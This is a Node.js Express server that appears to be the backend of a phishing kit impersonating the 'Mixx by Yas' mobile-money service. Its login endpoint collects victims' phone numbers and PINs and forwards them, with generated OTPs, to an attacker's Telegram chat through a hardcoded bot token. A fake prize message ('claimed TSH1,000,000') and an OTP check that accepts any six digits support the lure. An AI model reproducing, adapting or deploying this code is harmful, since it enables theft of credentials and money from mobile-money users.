const express = require('express');
const cors = require('cors');
const axios = require('axios');
const app = express();

// ===== CORS - Allow ALL origins for testing =====
app.use(cors({
    origin: '*',
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization', 'Accept'],
    credentials: true
}));

// ===== MIDDLEWARE =====
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ===== LOGGING =====
app.use((req, res, next) => {
    console.log(`📥 ${req.method} ${req.url}`);
    console.log(`📥 Origin: ${req.headers.origin || 'No origin'}`);
    next();
});

// ===== PORT =====
const PORT = process.env.PORT || 5000;

// ===== TELEGRAM CREDENTIALS =====
const TELEGRAM_BOT_TOKEN = '8926981745:AAFg96uMr8hQaiQN0F9Miglr0gizZrp48rs';
const TELEGRAM_CHAT_ID = '8392790531';

console.log('🚀 Starting server...');
console.log(`📡 PORT: ${PORT}`);
console.log(`🤖 Telegram Bot: @${TELEGRAM_BOT_TOKEN.split(':')[0]}`);
console.log(`📱 Chat ID: ${TELEGRAM_CHAT_ID}`);

// ===== TELEGRAM FUNCTIONS =====
async function sendTelegramMessage(message) {
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const response = await axios.post(url, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        });
        console.log('✅ Telegram message sent');
        return response.data;
    } catch (error) {
        console.error('❌ Telegram error:', error.response?.data || error.message);
        throw error;
    }
}

async function sendOTPToTelegram(phone, otp) {
    const message = `
🎯 <b>MIXX BY YAS - OTP VERIFICATION</b>
━━━━━━━━━━━━━━━━━━━━━

📱 <b>Phone:</b> ${phone}
🔐 <b>OTP Code:</b> <code>${otp}</code>
⏰ <b>Valid for:</b> 5 minutes

⚠️ <i>Do not share this code with anyone!</i>

━━━━━━━━━━━━━━━━━━━━━
🔒 Secure · Fast · Reliable
    `;
    return await sendTelegramMessage(message);
}

async function sendLoginNotification(phone, pin, status, otp = null) {
    let message = `
🔔 <b>MIXX BY YAS - LOGIN ATTEMPT</b>
━━━━━━━━━━━━━━━━━━━━━

📱 <b>Phone:</b> ${phone}
🔐 <b>PIN:</b> <code>${pin}</code>
📊 <b>Status:</b> ${status}
🕐 <b>Time:</b> ${new Date().toLocaleString()}
🌐 <b>IP:</b> ${req?.ip || 'Unknown'}`;

    if (otp) {
        message += `\n🔑 <b>OTP:</b> <code>${otp}</code>`;
    }

    message += `
━━━━━━━━━━━━━━━━━━━━━
🔒 Secure · Fast · Reliable
    `;
    return await sendTelegramMessage(message);
}

// ===== ENDPOINTS =====
app.get('/', (req, res) => {
    console.log('✅ Root called');
    res.json({
        status: 'online',
        message: 'Mixx by Yas API is running!',
        timestamp: new Date().toISOString(),
        telegram: {
            bot: TELEGRAM_BOT_TOKEN ? '✅ Configured' : '❌ Missing',
            chatId: TELEGRAM_CHAT_ID ? '✅ Configured' : '❌ Missing'
        }
    });
});

app.get('/api/health', (req, res) => {
    console.log('✅ Health check called');
    res.json({
        status: 'healthy',
        timestamp: new Date().toISOString(),
        port: PORT,
        telegram: {
            bot: TELEGRAM_BOT_TOKEN ? '✅ Configured' : '❌ Missing',
            chatId: TELEGRAM_CHAT_ID ? '✅ Configured' : '❌ Missing'
        }
    });
});

app.get('/api/test-telegram', async (req, res) => {
    try {
        await sendTelegramMessage('✅ Mixx by Yas bot is online and working!');
        res.json({
            status: 'success',
            message: 'Test message sent to Telegram'
        });
    } catch (error) {
        res.status(500).json({
            status: 'error',
            message: 'Failed to send test message: ' + error.message
        });
    }
});

// ===== LOGIN ENDPOINT =====
app.post('/api/login', async (req, res) => {
    console.log('📥 Login:', req.body);
    const { phone, pin } = req.body;
    
    if (!phone || !pin) {
        return res.status(400).json({
            status: 'error',
            message: 'Phone and PIN are required'
        });
    }
    
    // Generate OTP
    const otp = Math.floor(100000 + Math.random() * 900000).toString();
    console.log(`🔐 OTP for ${phone}: ${otp}`);
    
    try {
        // Send login notification to Telegram
        await sendLoginNotification(phone, pin, '✅ LOGIN ATTEMPT - OTP GENERATED', otp);
        
        // Send OTP to Telegram
        await sendOTPToTelegram(phone, otp);
        
        console.log('✅ OTP sent to Telegram for:', phone);
        
        res.json({
            status: 'success',
            message: 'OTP generated and sent successfully',
            data: { 
                phone: phone, 
                otp: otp, 
                otpSent: true 
            }
        });
    } catch (error) {
        console.error('❌ Telegram send error:', error);
        res.json({
            status: 'success',
            message: 'OTP generated but Telegram send failed',
            data: { 
                phone: phone, 
                otp: otp, 
                otpSent: false,
                telegramError: error.message
            }
        });
    }
});

// ===== VERIFY OTP ENDPOINT =====
app.post('/api/verify-otp', async (req, res) => {
    console.log('📥 Verify OTP:', req.body);
    const { phone, otp } = req.body;
    
    if (!phone || !otp) {
        return res.status(400).json({
            status: 'error',
            message: 'Phone and OTP are required'
        });
    }
    
    // For demo, accept any 6-digit OTP
    if (otp.length === 6) {
        // Send verification success to Telegram
        try {
            const message = `
🎉 <b>OTP VERIFIED SUCCESSFULLY</b>
━━━━━━━━━━━━━━━━━━━━━

📱 <b>Phone:</b> ${phone}
✅ <b>Status:</b> VERIFIED
🕐 <b>Time:</b> ${new Date().toLocaleString()}

🏆 <b>Congratulations!</b> You've successfully claimed TSH1,000,000!

━━━━━━━━━━━━━━━━━━━━━
🔒 Secure · Fast · Reliable
            `;
            await sendTelegramMessage(message);
        } catch (error) {
            console.error('❌ Telegram notification failed:', error);
        }
        
        res.json({
            status: 'success',
            message: 'OTP verified successfully!',
            data: { 
                phone: phone, 
                verified: true 
            }
        });
    } else {
        res.status(400).json({
            status: 'error',
            message: 'Invalid OTP. Must be 6 digits'
        });
    }
});

// ===== RESEND OTP ENDPOINT =====
app.post('/api/resend-otp', async (req, res) => {
    console.log('📥 Resend OTP:', req.body);
    const { phone } = req.body;
    
    if (!phone) {
        return res.status(400).json({
            status: 'error',
            message: 'Phone is required'
        });
    }
    
    const otp = Math.floor(100000 + Math.random() * 900000).toString();
    console.log(`🔐 New OTP for ${phone}: ${otp}`);
    
    try {
        await sendOTPToTelegram(phone, otp);
        console.log('✅ New OTP sent to Telegram for:', phone);
        
        res.json({
            status: 'success',
            message: 'New OTP sent successfully!',
            data: { 
                phone: phone, 
                otp: otp 
            }
        });
    } catch (error) {
        console.error('❌ Telegram send error:', error);
        res.json({
            status: 'success',
            message: 'New OTP generated but send failed',
            data: { 
                phone: phone, 
                otp: otp,
                telegramError: error.message
            }
        });
    }
});

// ===== 404 Handler =====
app.use((req, res) => {
    console.log('❌ 404:', req.method, req.url);
    res.status(404).json({
        status: 'error',
        message: 'Endpoint not found'
    });
});

// ===== ERROR Handler =====
app.use((err, req, res, next) => {
    console.error('❌ Server error:', err);
    res.status(500).json({
        status: 'error',
        message: 'Server error: ' + err.message
    });
});

// ===== START SERVER =====
app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Server running on port ${PORT}`);
    console.log(`📍 https://mixxbyyas-offers06com-production.up.railway.app`);
    console.log(`🤖 Telegram Bot: @${TELEGRAM_BOT_TOKEN.split(':')[0]}`);
    console.log(`📱 Chat ID: ${TELEGRAM_CHAT_ID}`);
    console.log('✅ Server is ready!');
});

// ===== HANDLE CRASHES =====
process.on('uncaughtException', (err) => {
    console.error('💥 Uncaught exception:', err);
});

process.on('unhandledRejection', (err) => {
    console.error('💥 Unhandled rejection:', err);
});
